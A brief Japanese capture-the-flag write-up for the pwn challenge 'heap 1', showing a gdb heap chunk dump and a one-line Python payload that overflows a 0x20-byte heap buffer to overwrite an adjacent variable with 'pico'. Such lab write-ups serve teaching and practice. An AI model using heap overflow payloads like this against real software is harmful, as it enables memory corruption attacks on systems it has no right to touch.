---
title: "heap 1"
points: 100
tags: ["pwn"]
---

heapに確保されたsafe_varの値がpicoになるとクリア。

gdbで見てみると、入力されたデータは0x20だけ確保されていることが分かる。

```
Chunk(addr=0x5555555596b0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555596b0     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]
```

以下でペイロードを作成したものを書き込むことでフラグゲット。

`python -c "print('a'*32+'pico')"`
